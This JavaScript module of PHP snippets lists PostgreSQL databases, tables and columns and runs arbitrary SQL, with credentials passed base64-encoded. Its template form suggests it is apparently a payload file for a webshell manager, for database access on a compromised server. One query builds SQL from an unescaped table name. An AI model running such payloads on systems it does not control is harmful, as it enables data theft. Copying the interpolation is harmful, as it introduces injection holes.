/**
 * 数据库管理模板::postgresql_pdo
 * i 数据分隔符号 => \\t|\\t
 */

module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
  // 显示所有数据库
  show_databases: {
    _: `
      $hst=base64_decode("#{base64::host}");
      $usr=base64_decode("#{base64::user}");
      $pwd=base64_decode("#{base64::passwd}");
      list($host, $port,$dbn) = explode(":", $hst);
      $port == "" ? $port = "5432" : $port;
      $dbn == "" ? $dbn = "postgres" : $dbn;
      $arr=array(
        'host'=>$host,
        'port'=>$port,
        'dbname'=>$dbn
      );
      $cs='pgsql:';
      foreach($arr as $k=>$v) {
        if(empty($v)){
          continue;
        }
        $cs .= "$k=$v;";
      }
      $dbh=new PDO($cs,$usr,$pwd);
      if(!$dbh){
        echo("ERROR://CONNECT ERROR");
      }else{
        $query="select datname FROM pg_database where datistemplate='f';";
        $result=$dbh->prepare($query);
        $result->execute();
        while($res=$result->fetch(PDO::FETCH_ASSOC)){
          echo(trim($res['datname']).chr(9));
        }
        $dbh=null;
      }`.replace(/\n\s+/g, ''),
  },
  // 显示数据库所有表
  show_tables: {
    _: `
      $hst=base64_decode("#{base64::host}");
      $usr=base64_decode("#{base64::user}");
      $pwd=base64_decode("#{base64::passwd}");
      $dbn=base64_decode("#{base64::db}");
      list($host, $port) = explode(":", $hst);
      $port == "" ? $port = "5432" : $port;
      $arr=array(
        'host'=>$host,
        'port'=>$port,
        'dbname'=>$dbn,
      );
      $cs='pgsql:';
      foreach($arr as $k=>$v) {
        if(empty($v)){
          continue;
        }
        $cs .= "$k=$v;";
      }
      $dbh=new PDO($cs,$usr,$pwd);
      if(!$dbh){
        echo("ERROR://CONNECT ERROR");
      }else{
        $query="SELECT table_name FROM information_schema.tables WHERE table_type='BASE TABLE' AND table_schema NOT IN ('pg_catalog', 'information_schema');";
        $result=$dbh->prepare($query);
        $result->execute();
        while($res=$result->fetch(PDO::FETCH_ASSOC)){
          echo(trim($res['table_name']).chr(9));
        }
        $dbh=null;
      }`.replace(/\n\s+/g, ''),
  },
  // 显示表字段
  show_columns: {
    _: `
      $hst=base64_decode("#{base64::host}");
      $usr=base64_decode("#{base64::user}");
      $pwd=base64_decode("#{base64::passwd}");
      $dbn=base64_decode("#{base64::db}");
      $tab=base64_decode("#{base64::table}");
      list($host, $port) = explode(":", $hst);
      $port == "" ? $port = "5432" : $port;
      $arr=array(
        'host'=>$host,
        'port'=>$port,
        'dbname'=>$dbn,
      );
      $cs='pgsql:';
      foreach($arr as $k=>$v) {
        if(empty($v)){
          continue;
        }
        $cs .= "$k=$v;";
      }
      $dbh=new PDO($cs,$usr,$pwd);
      if(!$dbh){
        echo("ERROR://CONNECT ERROR");
      }else{
        $query="SELECT column_name,udt_name,character_maximum_length FROM information_schema.COLUMNS WHERE TABLE_NAME = '{$tab}';";
        $result=$dbh->prepare($query);
        $result->execute();
        while($res=$result->fetch(PDO::FETCH_ASSOC)){
          $len=$res['character_maximum_length'] ? $res['character_maximum_length']:"0";
          echo(trim($res['column_name'])." ({$res['udt_name']}({$len}))".chr(9));
        }
        $dbh = null;
      }`.replace(/\n\s+/g, ''),
  },
  // 执行SQL语句
  query: {
    _: `
      $hst=base64_decode("#{base64::host}");
      $usr=base64_decode("#{base64::user}");
      $pwd=base64_decode("#{base64::passwd}");
      $dbn=base64_decode("#{base64::db}");
      $sql=base64_decode("#{base64::sql}");
      $encode=base64_decode("#{base64::encode}");
      list($host, $port) = explode(":", $hst);
      $port == "" ? $port = "5432" : $port;
      $arr=array(
        'host'=>$host,
        'port'=>$port,
        'dbname'=>$dbn,
      );
      $cs='pgsql:';
      foreach($arr as $k=>$v) {
        if(empty($v)){
          continue;
        }
        $cs .= "$k=$v;";
      }
      $dbh=new PDO($cs,$usr,$pwd);
      if(!$dbh){
        echo("ERROR://CONNECT ERROR");
      }else{
        $result=$dbh->prepare($sql);
        if(!$result->execute()){
          echo("Status\\t|\\t\\r\\n");
          $err="";
          foreach(@$result->errorInfo() as $v){
            $err.=$v." ";
          }
          echo(base64_encode("ERROR://".$err)."\\t|\\t\\r\\n");
        }else{
          $bool=True;
          while($res=$result->fetch(PDO::FETCH_ASSOC)){
            if($bool){
              foreach($res as $key=>$value){
                echo($key."\\t|\\t");
              }
              echo "\\r\\n";
              $bool=False;
            }
            foreach($res as $key=>$value){
              echo(base64_encode($value!==NULL?$value:"NULL")."\\t|\\t");
            }
            echo "\\r\\n";
          }
          if($bool){
            if(!$result->columnCount()){
              echo("Affect Rows\\t|\\t\\r\\n".base64_encode($result->rowCount())."\\t|\\t\\r\\n");
            }else{
              echo("Status\\t|\\t\\r\\n");
              echo(base64_encode("ERROR://Table is empty.")."\\t|\\t\\r\\n");
            }
          }
        }
        $dbh = null;
      }`.replace(/\n\s+/g, ''),
  }
})